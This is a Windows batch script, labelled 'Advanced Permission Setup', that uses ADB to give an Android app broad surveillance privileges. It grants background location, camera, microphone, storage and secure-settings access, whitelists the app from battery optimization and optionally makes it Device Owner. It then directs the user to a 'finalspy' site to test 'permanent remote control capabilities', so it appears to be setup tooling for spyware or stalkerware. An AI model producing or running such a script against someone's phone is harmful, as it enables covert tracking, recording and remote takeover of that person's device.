@echo off
echo ========================================
echo    Android App Advanced Permission Setup
echo ========================================
echo.
echo This script will grant elevated permissions to your Android app.
echo Make sure your device is connected via USB with debugging enabled.
echo.
pause

set PACKAGE_NAME=com.example.myapplication

echo.
echo Step 1: Granting WRITE_SECURE_SETTINGS permission...
adb shell pm grant %PACKAGE_NAME% android.permission.WRITE_SECURE_SETTINGS
if %errorlevel% neq 0 (
    echo ERROR: Failed to grant WRITE_SECURE_SETTINGS
    echo Make sure ADB is installed and device is connected
    pause
    exit /b 1
)
echo ✓ WRITE_SECURE_SETTINGS granted successfully

echo.
echo Step 2: Granting location permissions...
adb shell pm grant %PACKAGE_NAME% android.permission.ACCESS_FINE_LOCATION
adb shell pm grant %PACKAGE_NAME% android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant %PACKAGE_NAME% android.permission.ACCESS_BACKGROUND_LOCATION
echo ✓ Location permissions granted

echo.
echo Step 3: Granting camera and microphone permissions...
adb shell pm grant %PACKAGE_NAME% android.permission.CAMERA
adb shell pm grant %PACKAGE_NAME% android.permission.RECORD_AUDIO
echo ✓ Camera and microphone permissions granted

echo.
echo Step 4: Granting storage permissions...
adb shell pm grant %PACKAGE_NAME% android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant %PACKAGE_NAME% android.permission.WRITE_EXTERNAL_STORAGE
echo ✓ Storage permissions granted

echo.
echo Step 5: Disabling battery optimization...
adb shell dumpsys deviceidle whitelist +%PACKAGE_NAME%
echo ✓ Battery optimization disabled

echo.
echo ========================================
echo OPTIONAL: Set as Device Owner (Maximum Control)
echo ========================================
echo WARNING: This gives the app FULL device control!
echo Only proceed if you understand the implications.
echo.
set /p choice="Do you want to set the app as Device Owner? (y/N): "
if /i "%choice%"=="y" (
    echo.
    echo IMPORTANT: Remove all accounts from the device first!
    echo Go to Settings > Accounts and remove all Google/Samsung/etc accounts
    echo.
    pause
    echo Setting device owner...
    adb shell dpm set-device-owner %PACKAGE_NAME%/.admin.DeviceOwnerReceiver
    if %errorlevel% neq 0 (
        echo ERROR: Failed to set device owner
        echo Make sure all accounts are removed from the device
    ) else (
        echo ✓ Device owner set successfully
        echo Your app now has maximum control privileges!
    )
)

echo.
echo ========================================
echo Setup Complete!
echo ========================================
echo.
echo Next steps:
echo 1. Open your Android app
echo 2. Grant screen capture permission ONCE through the app UI
echo 3. Visit https://finalspy.onrender.com to test remote control
echo.
echo Your app should now have permanent remote control capabilities!
echo.
pause
